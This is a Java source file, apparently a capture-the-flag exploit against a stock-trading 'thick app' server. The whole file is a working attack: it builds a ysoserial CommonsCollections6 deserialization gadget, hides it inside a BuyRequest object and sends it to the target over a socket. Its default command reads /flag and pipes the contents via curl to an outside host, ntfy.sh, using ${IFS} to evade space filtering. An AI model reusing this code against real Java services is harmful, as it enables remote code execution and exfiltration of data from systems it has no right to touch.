package com.ctf.stockapp.client;

import com.ctf.stockapp.common.protocol.BuyRequest;

import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.net.Socket;

public class ExploitPayload {
    public static void main(String[] args) throws Exception {
        String host = "team54-thickapp.durhack.qwerty.technology";
        int port = 9999;
        String command = args.length > 0 ? args[0]
            : "bash -c cat</flag|curl${IFS}-s${IFS}-d@-${IFS}https://ntfy.sh/sglre6355";

        ClassLoader loader = ExploitPayload.class.getClassLoader();
        Class<?> payloadClass = Class.forName("ysoserial.payloads.CommonsCollections6", true, loader);
        Object payloadObject = payloadClass.getDeclaredConstructor().newInstance();
        Method getObject = payloadClass.getMethod("getObject", String.class);
        Object gadget = getObject.invoke(payloadObject, command);

        BuyRequest maliciousRequest = new BuyRequest("AMZN", 1);
        maliciousRequest.setData(gadget);

        try (Socket socket = new Socket(host, port);
             ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {
            oos.writeObject(maliciousRequest);
            oos.flush();
        }
    }
}
